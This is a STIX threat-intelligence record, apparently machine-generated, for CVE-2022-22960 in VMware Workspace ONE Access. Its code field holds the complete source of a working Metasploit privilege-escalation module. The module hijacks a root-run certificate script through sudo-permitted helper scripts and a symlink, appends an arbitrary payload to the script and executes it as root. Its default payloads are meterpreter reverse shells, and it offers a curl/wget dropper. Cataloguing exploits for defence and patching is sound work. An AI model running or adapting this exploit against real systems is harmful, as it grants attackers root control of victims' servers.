{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e4c9b15-85b1-4366-90a7-fcf2d05f6922",
    "created": "2024-08-14T16:59:45.027357Z",
    "modified": "2024-08-14T16:59:45.027361Z",
    "name": "VMware Workspace ONE Access CVE-2022-22960",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/vmware_workspace_one_access_cve_2022_22960.rb",
            "external_id": "vmware_workspace_one_access_cve_2022_22960.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22960"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sourceincite/hekate/"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2022-0011.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  TARGET_FILE = '/opt/vmware/certproxy/bin/certproxyService.sh'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VMware Workspace ONE Access CVE-2022-22960',\n          'Description' => %q{\n            This module exploits CVE-2022-22960 which allows the user to overwrite the permissions of the\n            certproxyService.sh script so that it can be modified by the horizon user. This allows a local attacker with\n            the uid 1001 to escalate their privileges to root access.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'mr_me', # Discovery & PoC\n            'jheysel-r7' # Metasploit Module\n          ],\n          'Platform' => [ 'linux', 'unix' ],\n          'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n          'SessionTypes' => ['shell', 'meterpreter'],\n          'Targets' => [\n            [\n              'Unix Command',\n              {\n                'Platform' => 'unix',\n                'Arch' => ARCH_CMD,\n                'Type' => :unix_cmd,\n                'DefaultOptions' => {\n                  'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'\n                }\n              }\n            ],\n            [\n              'Linux Dropper',\n              {\n                'Platform' => 'linux',\n                'Arch' => [ARCH_X64],\n                'Type' => :linux_dropper,\n                'CmdStagerFlavor' => %i[curl wget],\n                'DefaultOptions' => {\n                  'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n                }\n              }\n            ]\n          ],\n          'Privileged' => true,\n          'DefaultTarget' => 0,\n          'References' => [\n            [ 'CVE', '2022-22960' ],\n            ['URL', 'https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html#dbconnectioncheckcontroller-dbcheck-jdbc-injection-remote-code-execution'],\n            ['URL', 'https://github.com/sourceincite/hekate/'],\n            ['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0011.html']\n          ],\n          'DisclosureDate' => '2022-04-06',\n          'Notes' => {\n            # We're corrupting certproxyService.sh, if restoring the contents fails it won't work.\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => [ARTIFACTS_ON_DISK]\n          }\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def lpe_trigger(execute_payload)\n    cert_filename = Rex::Text.rand_text_alpha(4..12)\n    file_contents = <<~EOF\n      #!/bin/bash\n      cp #{TARGET_FILE} #{datastore['WritableDir']}/#{@certproxy_backup}\n      sudo /usr/local/horizon/scripts/publishCaCert.hzn #{TARGET_FILE} #{cert_filename}\n      mkdir #{cert_filename}\n      ln -s #{TARGET_FILE} #{cert_filename}/debugConfig.txt\n      sudo /usr/local/horizon/scripts/gatherConfig.hzn #{cert_filename}\n      rm -rf #{cert_filename}\n      chmod 755 #{TARGET_FILE}\n      echo \"mv /etc/ssl/certs/#{cert_filename} #{TARGET_FILE}\" > #{TARGET_FILE}\n      echo \"chown root:root #{TARGET_FILE}\" >> #{TARGET_FILE}\n      echo \"chmod 640 #{TARGET_FILE}\" >> #{TARGET_FILE}\n      echo \"#{execute_payload}\" >> #{TARGET_FILE}\n      echo \"mv #{datastore['WritableDir']}/#{@certproxy_backup} #{TARGET_FILE} && chmod 500 #{TARGET_FILE} && chown root:root #{TARGET_FILE}\" >> #{TARGET_FILE}#{' '}\n      sudo #{TARGET_FILE}\n    EOF\n    file_contents\n  end\n\n  def check\n    unless whoami == 'horizon'\n      return CheckCode::Safe('Not running as the horizon user.')\n    end\n\n    test = cmd_exec(\"sudo #{TARGET_FILE}\")\n    unless test.include? 'basename: missing operand'\n      CheckCode::Safe\n    end\n\n    CheckCode::Appears('vulnerable')\n  end\n\n  def exploit\n    @certproxy_backup = Rex::Text.rand_text_alpha(4..12)\n    payload_filename = Rex::Text.rand_text_alpha(4..12) + '.sh'\n    trigger_filename = Rex::Text.rand_text_alpha(4..12) + '.sh'\n\n    case target['Type']\n    when :unix_cmd\n      execute_payload = payload.encoded\n    when :linux_dropper\n      payload_path = \"#{datastore['WritableDir']}/#{payload_filename}\"\n      upload_and_chmodx(payload_path, generate_payload_exe)\n      execute_payload = \"#{datastore['WritableDir']}/#{payload_filename}\"\n      register_file_for_cleanup(payload_path)\n    else\n      fail_with(Failure::BadConfig, 'Invalid target specified')\n    end\n\n    lpe_trigger_data = lpe_trigger(execute_payload)\n\n    upload_and_chmodx(\"#{datastore['WritableDir']}/#{trigger_filename}\", lpe_trigger_data)\n    register_file_for_cleanup(\"#{datastore['WritableDir']}/#{trigger_filename}\")\n\n    print_status('Triggering the payload...')\n    cmd_exec(\"cd #{datastore['WritableDir']}; ./#{trigger_filename}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-04-06",
    "x_mitre_platforms": [
        "linux'"
    ]
}